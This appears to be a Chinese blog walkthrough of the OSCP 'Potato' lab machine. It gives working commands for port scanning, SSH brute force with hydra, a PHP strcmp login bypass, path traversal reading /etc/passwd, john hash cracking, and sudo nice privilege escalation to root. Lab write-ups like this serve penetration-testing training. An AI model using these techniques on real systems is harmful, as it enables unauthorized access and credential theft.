# 原创
：  从WEB到内网&&代码审计&&strcmp绕过&&sudo提权 ----- 打靶经验分享

# 从WEB到内网&amp;&amp;代码审计&amp;&amp;strcmp绕过&amp;&amp;sudo提权 ----- 打靶经验分享

## OSCP靶机-------Potato

今天来打一个OSCP的靶机，难度中等偏高，包含了端口探测，服务探测，ssh爆破，ftp匿名登录，前端代码审计，strcmp登录绕过，john爆破，sudo提权等等…靶场难度中等偏高，需要收集两个flag，一个flag低权限shell就可以获取，第二个要提权后才可以获取。希望大家看完可以有所收获。

### 启动环境

启动VPN：openvpn universal.ovpn<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/47fb1acaca8d79e759333ce086379efd.jpeg"/><br/> 攻击机IP为：192.168.45.173<br/> 启动靶机：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/47fa7876c143248014189ba2a007b528.jpeg"/><br/> 靶机IP为：192.168.215.101

### 信息收集

#### 1.端口

nmap扫描端口<br/> `nmap --min-rate 10000 -p- 192.168.215.101`<br/> 可以看到靶机开放三个端口;<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/52b6aa19f36f56b6c985ade19b60f23d.jpeg"/><br/> 22 ssh<br/> 80 http<br/> 2112 kip<br/> 端口服务探测：<br/> `nmap -p 22,80,2112 -sV 192.168.215.101`<br/> 探测到各端口对应服务为：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/cae0329ce316c91cb53f233334e60dc8.jpeg"/>

> 
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1<br/> 80/tcp open http Apache httpd 2.4.41 ((Ubuntu))<br/> 2112/tcp open ftp ProFTPD


#### 2.端口测试

**2.1**22-SSH端口<br/> 发现开启的22是ssh端口，且版本为 OpenSSH 8.2p1 Ubuntu，搜一下有没有对应的脚本：<br/> `searchsploit OpenSSH 8.2`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/291cf397fe38129d953997821d83f245.jpeg"/><br/> 没有就试试手工弱口令：<br/> `ssh root@192.168.215.101 -p 22`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c2c3b1b0d6bac08d0a45e7f3aa3771eb.jpeg"/><br/> 还是以失败告终，直接上ssh爆破，字典用msf，线程为6：<br/> `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.215.101 ssh -s 22`<br/> 等待…<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/26896169c95caf615df1893ea51c71ec.jpeg"/><br/> 肯定是没有的，下一步。<br/> **2.2**80-http<br/> 访问一下80端口：<br/> 192.168.215.101:80<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ef529259c4d56723ca898d0aeca0e364.jpeg"/><br/> 一个性感的土豆（狗头），啥都没有，不像有CMS的样子，扫一下目录看看。<br/> `dirsearch -u http://192.168.215.101/`

有admin看一下：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d0db5ac8b8a12b31a0d145140aed59bd.jpeg"/><br/> 登录框，可以试一下万能密码和弱口令。<br/> `admin' or '1'='1`<br/> 啥口令都登不上去<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/012c550b148982b600e01dafd45bee7f.jpeg"/><br/> 看一下/admin/logs/，有一个目录。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/57c5c3929fce70321c5c7de0b8650adc.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/6e570578f659920c3e1b9f6de4184930.jpeg"/><br/> 没什么有用的信息，知道了用户是admin。<br/> 还有个/index.php/login/<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2fa3758ddd700ea16b371011aedcd635.jpeg"/><br/> 土豆加载不出来，也没什么东西。<br/> **2.3**2112 ftp<br/> 2112端口是ftp服务，而且版本是 ProFTPD。先手工登录一下：<br/> `ftp 192.168.215.101 -p 2112`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/da3a6437950eaf02d79b076dc7a9a3a6.jpeg"/><br/> 用匿名用户anonymous登一下<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/bad79f90b3cdd2f5d3e5f51ee0fdf869.jpeg"/><br/> 允许匿名用户登录。收集一下有什么信息：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3fa71911f92b86b799d0e343efe5135a.jpeg"/>

```
binary  #二进制传输确保完整性
ls   #列出当前目录
get index.php.bak
get welcome.msg   #下载这两个文件

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e74ab352da80054e1389fd919a1fc863.jpeg"/><br/> 看一下下载到的两个文件：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/da4206a0ee6a52d7c36740374a066eea.jpeg"/><br/> 啥也没有。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/77cdfce12b6cc89c24a817977f3e72f0.jpeg"/><br/> 是一个登录页面的html代码。

### 攻击阶段

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/dd759fcb4cb8b255d0f544a5cd595040.jpeg"/><br/> 这里看到post传参的值是admin，和前面80端口收集到用户名一样。还有这里是一个strcmp函数，这个函数在进行对比，如果相同返回0不相同返回非0。它是一个PHP弱类型，这个函数比较的是字符串类型，如果强行传入其他参数就会出错，出错后返回0，返回0就可以绕过直接登录了。<br/> 理论成型，直接开干。<br/> burp先抓个登录包。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/71d79142cec1168f9861cb0e75d53305.jpeg"/><br/> 既然strcmp比较的是字符串类型，那就把密码变成数组且等于1传过去，这样应该就会出错。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/52ab98771fa780286c8117ccf8e92928.jpeg"/><br/> 发包<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/91b8cb526892116d60c8368b1d925c4b.jpeg"/><br/> 成功登录，开心。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9a4ca9b09c89ce410057257813249f93.jpeg"/><br/> 看到PING，还以为能有命令执行，结果不是。好像只有log能够跳转新站点。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ec0c2700ad24932e24647c8801fe5901.jpeg"/><br/> get the log是一个文件读取的功能，抓包看看能不能用目录穿越读取别的东西。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a68de168f23c5009f823cdda0e3cac85.jpeg"/><br/> 这个POST传参是可以修改的，试一下目录穿越直接读取passwd。<br/> `../../../../../etc/passwd`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3c8d4aea3644bd53188620d7eff339d9.jpeg"/><br/> 发包，成功读取到了psswd<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b776612b9e803eae6bf908e9d87ae823.jpeg"/><br/> 读到了webadmin用户的加密密码，尝试一下爆破解密。将密码存到文件中:<br/> `echo '$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/' → passwd.hash`<br/> 利用john爆破<br/> `john passwd.hash`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d0fc3aed8c79a18c3354ad6bdede1b72.jpeg"/><br/> 爆破出密码为dragon，直接ssh登录：<br/> `ssh webadmin@192.168.215.101 -p 22`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/732869f2895c3fb141fba7d85684fbe6.jpeg"/><br/> 成功拿到shell

### 内网渗透

获取flag1：<br/> `find / -name local.txt`<br/> `cat /home/webadmin/local.txt`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a026dc1fb51f6e5aecfb6f81584617a8.jpeg"/>

#### 提权

1.内核overlayfs提权<br/> `lsb_release -a`看看发行版本<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c75aab6aa3f8c1a60165aff0e96962ba.jpeg"/><br/> 20.04 不行<br/> 2.低内核版本提权<br/> `uname -a`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0581566deae25f1411ee46e12ee4094c.jpeg"/><br/> 5.4.0-42 不行<br/> 3.Cron job提权<br/> `cat /etc/crontab`<br/> 查找定时任务。没有<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d8423dcc72ee10bc61107a2c745b2cec.jpeg"/>

4.sudo提权<br/> `sudo -l`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4064929a500cfaf52e0e9fe1a3ba7d18.jpeg"/><br/> 有东西：

> 
(ALL : ALL) /bin/nice /notes/*<br/> 去https://gtfobins.github.io找提权方式：<br/> 搜索nice<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/40e95051f4da465577414477d8aba7a4.jpeg"/><br/> 在/notes/文件下任意内容都可以sudo执行nice<br/> 去一个可执行目录：


```
cd /tmp
echo '/bin/sh -p' &gt; shell   #写入shell
cat shell     #查看shell
chmod +x shell    #给shell加权限

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c4852935e0da10be28c06c4cd338e20c.jpeg"/><br/> 利用目录穿越绕过sudo的限制<br/> `sudo /bin/nice /notes/../../tmp/shell`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7473b6ecc32304b80559f419b788225e.jpeg"/><br/> 成功提权。<br/> 获取flag2：<br/> `cat /root/proof.txt`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c42856cff56e065b45d839df868fc9d0.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0641ff350bb43c271e021d7cb6035a5f.jpeg"/><br/> 完结。
